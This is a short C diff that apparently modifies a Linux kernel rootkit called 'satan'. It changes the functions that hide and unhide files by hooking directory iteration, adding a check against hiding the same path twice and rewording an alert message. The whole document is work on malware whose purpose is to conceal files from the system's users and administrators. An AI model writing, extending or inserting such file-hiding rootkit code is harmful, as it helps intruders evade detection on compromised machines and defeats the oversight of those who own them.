@@ -127,7 +127,14 @@ void satan_file_exit(void)
  */
 int satan_file_hide(const char *path)
 {
-        struct hidden_file *f = hidden_files_list_add(path);
+        struct hidden_file *f = hidden_files_list_get(path);
+
+        if (f) {
+                pr_alert("satan: file: %s is already hidden\n", path);
+                return 1;
+        }
+
+        f = hidden_files_list_add(path);
         return satan_file_hook_iterate_shared(f);
 }
 
@@ -142,7 +149,7 @@ int satan_file_unhide(const char *path)
         struct hidden_file *f = hidden_files_list_get(path);
 
         if (!f) {
-                pr_alert("satan: file: failed to unhide %s\n", path);
+                pr_alert("satan: file: %s has not been hidden before\n", path);
                 return 1;
         }
 
